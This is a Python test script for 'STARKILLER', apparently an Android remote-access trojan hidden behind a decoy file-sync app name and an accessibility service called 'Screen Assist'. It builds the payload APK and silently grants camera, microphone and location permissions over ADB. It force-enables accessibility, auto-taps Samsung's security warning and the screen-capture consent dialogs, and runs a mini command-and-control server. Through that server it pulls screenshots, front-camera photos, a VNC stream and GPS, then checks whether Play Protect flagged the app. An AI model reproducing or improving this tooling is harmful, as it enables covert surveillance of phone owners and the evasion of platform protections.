#!/usr/bin/env python3
"""
STARKILLER -- Automated Grant & Capability Test
22DIV / george wu

ADB-connected device test. Does everything a user would do manually:
  1. Grants all runtime permissions silently via ADB
  2. Enables AccessibilityService via ADB settings (no UI tap needed)
  3. Builds a test APK pointing to 127.0.0.1:8667
  4. Sets up adb reverse TCP tunnel to mini C2
  5. Installs + launches app
  6. Waits for agent connection
  7. Fires: screenshot, camera, vnc, gps, sysinfo
  8. Saves proof images to test_output/

Usage:
    python test_auto.py [--no-rebuild]   # --no-rebuild skips APK build (faster)

Requirements: ADB in PATH, device connected.
"""
import os
import sys
import json
import socket
import struct
import time
import subprocess
import threading
import base64
import uuid
import argparse
from pathlib import Path
from datetime import datetime

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

ROOT = Path(__file__).parent
OUT_DIR = ROOT / "test_output"
PACKAGE = "com.georgetech.filesync"
DEVICE_PORT = 8667
TEST_PORT = 18667

os.makedirs(OUT_DIR, exist_ok=True)

R = "\033[91m"; G = "\033[92m"; A = "\033[93m"; D = "\033[90m"; W = "\033[97m"; X = "\033[0m"

passed = 0; failed = 0

def ok(msg): global passed; passed += 1; print(f"  {G}[PASS]{X} {msg}")
def fail(msg, detail=""): global failed; failed += 1; print(f"  {R}[FAIL]{X} {msg}" + (f": {detail}" if detail else ""))
def info(msg): print(f"  {A}[....]{X} {msg}")
def section(msg): print(f"\n  {W}{msg}{X}")

# ------------------------------------------------------------------------------
# ADB helpers
# ------------------------------------------------------------------------------

def adb(cmd, timeout=15):
    try:
        r = subprocess.run(f"adb {cmd}", shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.returncode == 0
    except subprocess.TimeoutExpired:
        return "", False

def check_device():
    out, _ = adb("devices")
    lines = [l for l in out.splitlines() if "\tdevice" in l]
    return len(lines) > 0

def grant_permissions():
    perms = [
        "android.permission.CAMERA",
        "android.permission.RECORD_AUDIO",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
    ]
    results = []
    for p in perms:
        _, ok_ = adb(f"shell pm grant {PACKAGE} {p}")
        results.append(ok_)
    return all(results)

def enable_accessibility():
    SVC = f"{PACKAGE}/.AccessService"
    # Get current value, append if needed
    cur, _ = adb("shell settings get secure enabled_accessibility_services")
    if PACKAGE in cur:
        return True
    new_val = f"{cur}:{SVC}" if cur and cur != "null" else SVC
    adb(f"shell settings put secure enabled_accessibility_services {new_val}")
    adb("shell settings put secure accessibility_enabled 1")
    time.sleep(1)
    # Verify
    check, _ = adb("shell settings get secure enabled_accessibility_services")
    return PACKAGE in check

def setup_reverse():
    adb(f"reverse tcp:{DEVICE_PORT} tcp:{TEST_PORT}")

def launch_app():
    adb(f"shell am force-stop {PACKAGE}")
    time.sleep(0.5)
    adb(f"shell monkey -p {PACKAGE} -c android.intent.category.LAUNCHER 1")

def build_test_apk():
    info("Building test APK (127.0.0.1:8667)...")
    r = subprocess.run(
        "python build.py --ip 127.0.0.1 --port 8667 --name DayBoard",
        shell=True, capture_output=True, text=True, cwd=str(ROOT), timeout=180
    )
    if r.returncode != 0:
        print(r.stdout[-2000:]); print(r.stderr[-500:])
        return False
    apk = ROOT / "payloads" / "starkiller-debug.apk"
    if not apk.exists():
        return False
    out, ok_ = adb(f"install -r {apk}", timeout=60)
    return ok_ or "Success" in out

# ------------------------------------------------------------------------------
# Mini C2 protocol
# ------------------------------------------------------------------------------

def send_msg(sock, data):
    raw = json.dumps(data).encode("utf-8")
    sock.sendall(struct.pack(">I", len(raw)) + raw)

def recv_msg(sock, timeout=20):
    sock.settimeout(timeout)
    try:
        hdr = b""
        while len(hdr) < 4:
            chunk = sock.recv(4 - len(hdr))
            if not chunk: return None
            hdr += chunk
        n = struct.unpack(">I", hdr)[0]
        if n > 50 * 1024 * 1024: return None
        body = b""
        while len(body) < n:
            chunk = sock.recv(min(65536, n - len(body)))
            if not chunk: return None
            body += chunk
        return json.loads(body.decode("utf-8"))
    except socket.timeout:
        return None
    finally:
        sock.settimeout(None)

def dispatch_and_wait(agent_sock, op, timeout=30, **kwargs):
    task_id = uuid.uuid4().hex[:6]
    send_msg(agent_sock, {"type": "task", "task_id": task_id, "op": op, **kwargs})
    deadline = time.time() + timeout
    while time.time() < deadline:
        remaining = max(2, deadline - time.time())
        msg = recv_msg(agent_sock, timeout=remaining)
        if msg is None: break
        if msg.get("type") == "result" and msg.get("task_id") == task_id:
            return msg.get("data", {})
        # heartbeat or VNC frame stream -- flush and keep waiting
        if msg.get("type") == "result" and "frame" in msg.get("data", {}):
            frame_data = msg["data"]
            _save_frame(frame_data, op, frame_data.get("frame", 0))
    return None

_vnc_frames = []

def _save_frame(data, op, idx):
    b64 = data.get("data") or data.get("image") or data.get("frame_data")
    if not b64: return
    ts = datetime.now().strftime("%H%M%S")
    fname = OUT_DIR / f"{op}_{ts}_{idx:03d}.jpg"
    with open(fname, "wb") as f:
        f.write(base64.b64decode(b64))
    _vnc_frames.append(str(fname))

def dispatch_vnc(agent_sock, frames=5, interval=500):
    task_id = uuid.uuid4().hex[:6]
    send_msg(agent_sock, {"type": "task", "task_id": task_id, "op": "vnc",
                           "interval": interval, "frames": frames})
    saved = 0
    deadline = time.time() + (frames * interval / 1000) + 15
    while time.time() < deadline and saved < frames:
        msg = recv_msg(agent_sock, timeout=max(2, deadline - time.time()))
        if msg is None: break
        d = msg.get("data", {})
        b64 = d.get("data") or d.get("image")
        if b64:
            ts = datetime.now().strftime("%H%M%S")
            fname = OUT_DIR / f"vnc_{ts}_{saved:03d}.jpg"
            with open(fname, "wb") as f:
                f.write(base64.b64decode(b64))
            saved += 1
            info(f"  VNC frame {saved}/{frames} saved ({len(base64.b64decode(b64))//1024}KB)")
        # Break only on the final stream_done result, NOT intermediate frame results.
        # Intermediate frames also have type=result + matching task_id but include "frame" key.
        if msg.get("type") == "result" and msg.get("task_id") == task_id:
            if "frame" not in d:  # final stream_done has no "frame" key
                break
    return saved

# ------------------------------------------------------------------------------
# Mini C2 server -- waits for device to connect
# ------------------------------------------------------------------------------

_agent_conn = None
_agent_info = {}
_agent_event = threading.Event()

def _agent_handler(conn, addr):
    global _agent_conn, _agent_info
    try:
        msg = recv_msg(conn, timeout=15)
        if not msg or msg.get("type") != "register":
            conn.close(); return
        _agent_info = msg
        _agent_conn = conn
        _agent_event.set()
        # Keep thread alive while test runs
        while True:
            time.sleep(0.5)
            if _agent_conn is None:
                break
    except Exception:
        pass

def start_mini_c2():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", TEST_PORT))
    srv.listen(4)
    info(f"Mini C2 listening on localhost:{TEST_PORT}")

    def accept_loop():
        while True:
            try:
                conn, addr = srv.accept()
                threading.Thread(target=_agent_handler, args=(conn, addr), daemon=True).start()
            except Exception:
                break

    threading.Thread(target=accept_loop, daemon=True).start()
    return srv

# ------------------------------------------------------------------------------
# Samsung accessibility UI automation
# ------------------------------------------------------------------------------

def _dump_xml():
    """uiautomator XML dump -- strips Samsung's trailing garbage after </hierarchy>"""
    import xml.etree.ElementTree as ET
    try:
        raw = subprocess.check_output(
            ["adb", "exec-out", "uiautomator", "dump", "/dev/fd/1"],
            stderr=subprocess.DEVNULL, timeout=8
        ).decode("utf-8", errors="replace")
        end_tag = raw.rfind("</hierarchy>")
        xml_out = raw[:end_tag + len("</hierarchy>")] if end_tag >= 0 else raw
        return ET.fromstring(xml_out) if xml_out.strip().startswith("<") else None
    except Exception:
        return None

def _find_node(root, keywords):
    """Find first node whose text or content-desc contains any keyword (case-insensitive)"""
    if root is None:
        return None
    for node in root.iter("node"):
        combined = (node.get("text", "") + " " + node.get("content-desc", "")).lower()
        for k in keywords:
            if k.lower() in combined:
                return node
    return None

def _tap_node(node):
    """Tap center of a node from its bounds attribute"""
    import re
    bounds = node.get("bounds", "")
    coords = re.findall(r'\[(\d+),(\d+)\]', bounds)
    if len(coords) == 2:
        cx = (int(coords[0][0]) + int(coords[1][0])) // 2
        cy = (int(coords[0][1]) + int(coords[1][1])) // 2
        adb(f"shell input tap {cx} {cy}")
        return cx, cy
    return None

def _samsung_enable_accessibility_via_ui(conn):
    """
    Navigate Samsung One UI 4 Settings to enable Screen Assist accessibility service.
    Path: Accessibility → Installed apps → Screen Assist → toggle → Allow
    Samsung blocks ADB settings writes for third-party services; UI confirm is required once.
    Returns True if acc_available becomes True.
    """
    # Step 1: open Accessibility Settings
    adb("shell am start -a android.settings.ACCESSIBILITY_SETTINGS")
    time.sleep(2)

    # Step 2: tap "Installed apps" (Samsung puts third-party services here)
    root = _dump_xml()
    installed = _find_node(root, ["installed apps", "downloaded apps"])
    if installed is None:
        info("  'Installed apps' section not found -- accessibility settings layout unexpected")
        adb("shell input keyevent KEYCODE_BACK")
        return False
    coords = _tap_node(installed)
    info(f"  Tapped 'Installed apps' at {coords}")
    time.sleep(1.5)

    # Step 3: find and tap "Screen Assist" in the list
    root = _dump_xml()
    svc = _find_node(root, ["screen assist"])
    if svc is None:
        info("  'Screen Assist' not found in Installed apps list")
        adb("shell input keyevent KEYCODE_BACK"); adb("shell input keyevent KEYCODE_BACK")
        return False
    coords = _tap_node(svc)
    info(f"  Tapped 'Screen Assist' at {coords}")
    time.sleep(1.5)

    # Step 4: tap the main On/Off Switch if it's off
    # Samsung detail page has SeslSwitchBar > Switch as first switch widget
    root = _dump_xml()
    switches = [n for n in root.iter("node") if "Switch" in n.get("class", "")]
    if not switches:
        info("  No Switch found on Screen Assist detail page")
        adb("shell input keyevent KEYCODE_BACK"); adb("shell input keyevent KEYCODE_BACK"); adb("shell input keyevent KEYCODE_BACK")
        return False
    main_switch = switches[0]
    if main_switch.get("checked", "false").lower() == "true":
        info("  Toggle already ON -- waiting for service to bind")
    else:
        coords = _tap_node(main_switch)
        info(f"  Tapped main toggle at {coords}")
        time.sleep(1.5)

    # Step 5: Samsung warning dialog -- tap "Allow" (exact, not "Deny" or "Uninstall")
    root = _dump_xml()
    allow_btn = None
    for n in root.iter("node"):
        if n.get("text", "").strip().lower() == "allow":
            allow_btn = n
            break
    if allow_btn is not None:
        coords = _tap_node(allow_btn)
        info(f"  Tapped 'Allow' at {coords}")
        time.sleep(2)
    else:
        info("  No 'Allow' dialog -- may already be enabled or auto-confirmed")

    # Step 6: screenshot proof + return to app
    ts = datetime.now().strftime("%H%M%S")
    adb(f"shell screencap -p /sdcard/sk_a11y_{ts}.png")
    adb(f"pull /sdcard/sk_a11y_{ts}.png {OUT_DIR}/a11y_confirm_{ts}.png")
    adb("shell input keyevent KEYCODE_BACK")
    adb("shell input keyevent KEYCODE_BACK")
    adb("shell input keyevent KEYCODE_BACK")
    time.sleep(1.5)

    # Step 7: poll acc_available (service needs up to 5s to bind after confirm)
    for attempt in range(5):
        time.sleep(1)
        sr = dispatch_and_wait(conn, "acc_status", timeout=5)
        if sr is not None and sr.get("acc_available"):
            ok(f"AccessibilityService BOUND after UI confirm ({attempt+1}s)")
            return True
        info(f"  acc_available=False after confirm ({attempt+1}/5)...")

    info("AccessibilityService still not bound -- falls back to MediaProjection")
    return False


# ------------------------------------------------------------------------------
# Main
# ------------------------------------------------------------------------------

def main():
    global _agent_conn
    parser = argparse.ArgumentParser()
    parser.add_argument("--no-rebuild", action="store_true", help="Skip APK build")
    args = parser.parse_args()

    print(f"""
{R}  STARKILLER AUTO-GRANT TEST{X}
{D}  -----------------------------{X}
{D}  ADB-connected Samsung SM-G970U{X}
{D}  Tests: screenshot, camera, VNC{X}
{D}  Output: test_output/{X}
{D}  -----------------------------{X}
""")

    # -- Phase 0: Wake + unlock (must happen before any UI interaction) --------
    # Samsung locks after ~30s idle. wm dismiss-keyguard works when no PIN is set.
    adb("shell input keyevent KEYCODE_WAKEUP")
    time.sleep(0.5)
    adb("shell wm dismiss-keyguard")
    time.sleep(0.5)

    # -- Phase 1: ADB device check -------------------------------------------
    section("[PHASE 1] ADB DEVICE")
    if not check_device():
        fail("ADB device connected", "No device found. Plug in + authorize ADB.")
        sys.exit(1)
    ok("ADB device connected")

    # -- Phase 2: Build + install --------------------------------------------
    section("[PHASE 2] BUILD + INSTALL")
    if args.no_rebuild:
        info("--no-rebuild: skipping APK build, installing existing payload")
        apk = ROOT / "payloads" / "starkiller-debug.apk"
        if apk.exists():
            out, ok_ = adb(f"install -r {apk}", timeout=60)
            if ok_ or "Success" in out:
                ok("APK installed (existing payload)")
            else:
                fail("APK install", out)
        else:
            fail("Existing APK not found", str(apk))
    else:
        if build_test_apk():
            ok("Test APK built (127.0.0.1:8667) + installed")
        else:
            fail("Build/install test APK")
            sys.exit(1)

    # -- Phase 3: Silent permission grants ----------------------------------
    section("[PHASE 3] SILENT PERMISSION GRANTS")
    if grant_permissions():
        ok("Runtime permissions granted via ADB pm grant")
    else:
        fail("Some runtime permissions failed -- may need --reinstall first")

    if enable_accessibility():
        ok("AccessibilityService enabled via ADB settings")
    else:
        fail("Accessibility enable failed -- may need manual accept once")
        info("  Run: adb shell settings put secure enabled_accessibility_services "
             f"{PACKAGE}/.AccessService")

    # -- Phase 4: Mini C2 + ADB reverse -------------------------------------
    section("[PHASE 4] MINI C2 + ADB REVERSE")
    srv = start_mini_c2()
    setup_reverse()
    ok(f"ADB reverse: device:{DEVICE_PORT} → localhost:{TEST_PORT}")

    # -- Phase 5: Launch + wait for connection -------------------------------
    section("[PHASE 5] APP LAUNCH + CONNECTION")
    launch_app()
    info("Waiting for agent registration (30s)...")
    connected = _agent_event.wait(timeout=30)
    if connected:
        host = _agent_info.get("hostname", "?")
        model = _agent_info.get("model", "?")
        ok(f"Agent connected: {host} ({model})")
    else:
        fail("Agent did not connect within 30s")
        info("  Check: app installed? ngrok vs 127.0.0.1? Firewall?")
        srv.close(); sys.exit(1)

    conn = _agent_conn

    # -- Phase 6: Capability check (retry -- accessibility binding can take 5-8s on Samsung) --
    section("[PHASE 6] CAPABILITY CHECK (acc_status)")
    acc = False; scr = False
    for attempt in range(6):
        result = dispatch_and_wait(conn, "acc_status", timeout=8)
        if result:
            acc = result.get("acc_available", False)
            scr = result.get("screen_grant", False)
            if acc:
                break
        if attempt < 5:
            info(f"  acc_available=False (attempt {attempt+1}/6) -- waiting 3s for binding...")
            time.sleep(3)
    ok(f"acc_available={acc} screen_grant={scr}")
    if acc:
        ok("AccessibilityService BOUND -- VNC works without grant dialog")
    else:
        # Samsung blocks ADB settings writes for third-party accessibility services.
        # Must navigate through Settings UI: Accessibility → Screen Assist → toggle → Allow.
        info("Samsung blocks ADB a11y grant -- navigating Settings UI for one-time confirm...")
        acc = _samsung_enable_accessibility_via_ui(conn)

    # -- Phase 7: Screenshot -------------------------------------------------
    section("[PHASE 7] SCREENSHOT")
    result = dispatch_and_wait(conn, "screenshot", timeout=20)
    if result and "error" not in result:
        b64 = result.get("data") or result.get("image")
        source = result.get("source", "?")
        if b64:
            img_bytes = base64.b64decode(b64)
            ts = datetime.now().strftime("%H%M%S")
            fname = OUT_DIR / f"screenshot_{ts}.jpg"
            with open(fname, "wb") as f: f.write(img_bytes)
            ok(f"Screenshot [{source}] → {fname.name} ({len(img_bytes)//1024}KB)")
        else:
            fail("Screenshot: no image data in result", str(list(result.keys())))
    elif result and "error" in result:
        # Fallback: ADB screencap (works when USB connected, bypasses all Android grants)
        info(f"App screenshot needs grant ({result['error']}) -- using ADB screencap as proof")
        ts = datetime.now().strftime("%H%M%S")
        adb(f"shell screencap -p /sdcard/sk_test_{ts}.png")
        adb_out, ok_ = adb(f"pull /sdcard/sk_test_{ts}.png {OUT_DIR}/adb_screen_{ts}.png")
        if ok_ or "pulled" in adb_out.lower():
            ok(f"ADB screencap (USB path) → adb_screen_{ts}.png [grant not yet enabled]")
        else:
            fail("Screenshot error + ADB screencap failed", result.get("error", ""))
    else:
        fail("Screenshot: no response (timeout)")

    # -- Phase 8: Camera -----------------------------------------------------
    section("[PHASE 8] CAMERA")
    result = dispatch_and_wait(conn, "camera", timeout=20, camera="front")
    if result and "error" not in result:
        b64 = result.get("data") or result.get("image")
        if b64:
            img_bytes = base64.b64decode(b64)
            ts = datetime.now().strftime("%H%M%S")
            fname = OUT_DIR / f"camera_front_{ts}.jpg"
            with open(fname, "wb") as f: f.write(img_bytes)
            ok(f"Camera front → {fname.name} ({len(img_bytes)//1024}KB)")
        else:
            fail("Camera: no image in result", str(list(result.keys())))
    elif result:
        fail("Camera error", result.get("error", str(result)))
    else:
        fail("Camera: no response (timeout)")

    # -- Phase 9: VNC stream --------------------------------------------------
    section("[PHASE 9] VNC STREAM (5 frames)")
    saved = dispatch_vnc(conn, frames=5, interval=500)
    if saved == 0:
        # Try MediaProjection path: trigger grant dialog, auto-tap "Start now"
        info("VNC needs grant -- triggering screen_grant + auto-tap 'Start now'")
        dispatch_and_wait(conn, "screen_grant", timeout=5)
        time.sleep(2)
        # Save screencap to see what's actually on screen after screen_grant
        ts_sg = datetime.now().strftime("%H%M%S")
        adb(f"shell screencap -p /sdcard/sk_grant_{ts_sg}.png")
        adb(f"pull /sdcard/sk_grant_{ts_sg}.png {OUT_DIR}/grant_dialog_{ts_sg}.png")
        info(f"Screencap after screen_grant → grant_dialog_{ts_sg}.png")

        # Find "Start now" or "Allow" button via uiautomator XML
        # Samsung appends a trailing message after XML -- truncate at </hierarchy>
        import subprocess, xml.etree.ElementTree as ET, re
        try:
            raw = subprocess.check_output(
                ["adb", "exec-out", "uiautomator", "dump", "/dev/fd/1"],
                stderr=subprocess.DEVNULL, timeout=8
            ).decode("utf-8", errors="replace")
            # Strip Samsung's trailing "UI hierchary dumped to: ..." message
            end_tag = raw.rfind("</hierarchy>")
            xml_out = raw[:end_tag + len("</hierarchy>")] if end_tag >= 0 else raw
            root = ET.fromstring(xml_out) if xml_out.strip().startswith("<") else None
            tapped = False
            if root is not None:
                for node in root.iter("node"):
                    txt = (node.get("text", "") + node.get("content-desc", "")).lower()
                    if any(k in txt for k in ["start now", "allow", "jetzt starten", "démarrer"]):
                        bounds = node.get("bounds", "")
                        coords = re.findall(r'\[(\d+),(\d+)\]', bounds)
                        if len(coords) == 2:
                            cx = (int(coords[0][0]) + int(coords[1][0])) // 2
                            cy = (int(coords[0][1]) + int(coords[1][1])) // 2
                            adb(f"shell input tap {cx} {cy}")
                            info(f"Tapped '{node.get('text', '')}' at ({cx},{cy})")
                            tapped = True
                            break
            if not tapped:
                info("'Start now' not found in UI -- trying Samsung One UI coords (540,2060)")
                adb("shell input tap 540 2060")
        except Exception as e:
            info(f"uiautomator parse failed: {e} -- trying coords (540,2060)")
            adb("shell input tap 540 2060")
        # Poll for screen_grant=True (up to 10s after tap)
        screen_granted = False
        for attempt in range(10):
            time.sleep(1)
            sr = dispatch_and_wait(conn, "acc_status", timeout=3)
            if sr and sr.get("screen_grant"):
                screen_granted = True
                info(f"screen_grant=True after {attempt+1}s -- dispatching VNC")
                break
            err = sr.get("last_setup_err", "") if sr else ""
            info(f"  screen_grant=False setup_err=[{err}] (poll {attempt+1}/10)...")
        if not screen_granted:
            info("screen_grant never became True -- MediaProjection tap may have failed")
        # Retry VNC after grant (or attempt anyway for diagnostics)
        saved = dispatch_vnc(conn, frames=5, interval=500)

    if saved >= 5:
        ok(f"VNC stream: {saved}/5 frames saved to test_output/")
    elif saved > 0:
        ok(f"VNC partial: {saved}/5 frames (grant may have been delayed)")
    else:
        fail("VNC: 0 frames received -- manual setup needed: enable 'Screen Assist' in Accessibility Settings")

    # -- Phase 10: GPS --------------------------------------------------------
    section("[PHASE 10] GPS")
    result = dispatch_and_wait(conn, "gps", timeout=20)
    if result and "error" not in result:
        lat = result.get("latitude", "?")
        lon = result.get("longitude", "?")
        ok(f"GPS: {lat},{lon}")
    elif result:
        fail("GPS error", result.get("error", str(result)))
    else:
        fail("GPS: no response")

    # -- Phase 11: Play Protect scan ------------------------------------------
    section("[PHASE 11] PLAY PROTECT SCAN (passive)")
    info("Checking if Play Protect flagged the app...")
    out, _ = adb(f"shell dumpsys package {PACKAGE} 2>/dev/null | grep -i 'harmful\\|danger\\|unsafe\\|malware'")
    if out.strip():
        fail("Play Protect flagged", out[:200])
    else:
        ok("No Play Protect flag detected in package dump")

    # -- Results --------------------------------------------------------------
    print(f"""
{D}  ================================{X}
  {W}RESULTS:{X}  {G}{passed} passed{X}  {R}{failed} failed{X}
{D}  ================================{X}
  Proof images: {OUT_DIR}
""")

    # Cleanup
    _agent_conn = None
    try: srv.close()
    except Exception: pass
    adb(f"reverse --remove tcp:{DEVICE_PORT}")

    return failed == 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
